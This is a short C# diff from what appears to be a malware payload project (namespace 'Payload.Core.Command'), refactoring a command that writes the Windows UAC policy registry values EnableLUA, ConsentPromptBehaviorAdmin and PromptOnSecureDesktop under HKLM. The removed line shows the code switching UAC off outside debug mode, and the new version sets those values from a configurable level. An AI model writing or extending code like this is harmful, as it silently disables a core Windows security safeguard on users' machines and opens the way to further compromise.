@@ -30,7 +30,7 @@ PromptOnSecureDesktop：0
 */
 namespace Payload.Core.Command
 {
-    public class RegistryKeyCommand : Payload.Command.Interface.ICommand
+    public class RegistryKeyCommand : IUacCommand
     {
         public override Task Execute()
         {
@@ -51,11 +51,10 @@ namespace Payload.Core.Command
             RegistryKey uac = Registry.LocalMachine.CreateSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, rs);
             if (uac == null)
                 uac = Registry.LocalMachine.CreateSubKey(key);
-            UacConifg.UAC_TYPE uacLevel = Config.Instance.AppMode.Equals(EnumAppMode.DEBUG) ? UacConifg.UAC_TYPE.HIGH : UacConifg.UAC_TYPE.CLOSE;
 
-            uac.SetValue(UacConifg.ConsentPromptBehaviorAdmin_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name));
-            uac.SetValue(UacConifg.EnableLUA_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.EnableLUA_Name));
-            uac.SetValue(UacConifg.PromptOnSecureDesktop_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.PromptOnSecureDesktop_Name));
+            uac.SetValue(UacConifg.ConsentPromptBehaviorAdmin_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name));
+            uac.SetValue(UacConifg.EnableLUA_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.EnableLUA_Name));
+            uac.SetValue(UacConifg.PromptOnSecureDesktop_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.PromptOnSecureDesktop_Name));
 
             uac.Close();
         }
